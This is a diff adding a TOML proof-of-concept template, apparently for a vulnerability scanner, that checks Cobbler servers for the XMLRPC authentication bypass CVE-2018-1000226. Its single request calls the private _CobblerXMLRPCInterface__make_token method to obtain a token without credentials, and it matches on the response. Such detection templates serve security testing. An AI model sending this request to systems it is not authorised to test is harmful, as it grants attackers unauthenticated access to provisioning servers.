@@ -1,0 +1,46 @@
+[info]
+author = "ave"
+description = "通过调用 _CobblerXMLRPCInterface__make_token 方法验证 Cobbler XMLRPC API 是否存在身份验证绕过漏洞"
+id = "POC-AVE-2018-0021"
+name = "Cobbler XMLRPC API Authentication Bypass PoC"
+severity = "critical"
+tags = ["ave-2018-0021"]
+vuln_id = [
+    "CVE-2018-1000226",
+    "AVE-2018-0021",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/cobbler_api"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<?xml version='1.0'?>
+<methodCall>
+<methodName>_CobblerXMLRPCInterface__make_token</methodName>
+<params>
+<param>
+<value><string>cobbler</string></value>
+</param>
+</params>
+</methodCall>"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "text/xml"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<methodResponse>"]
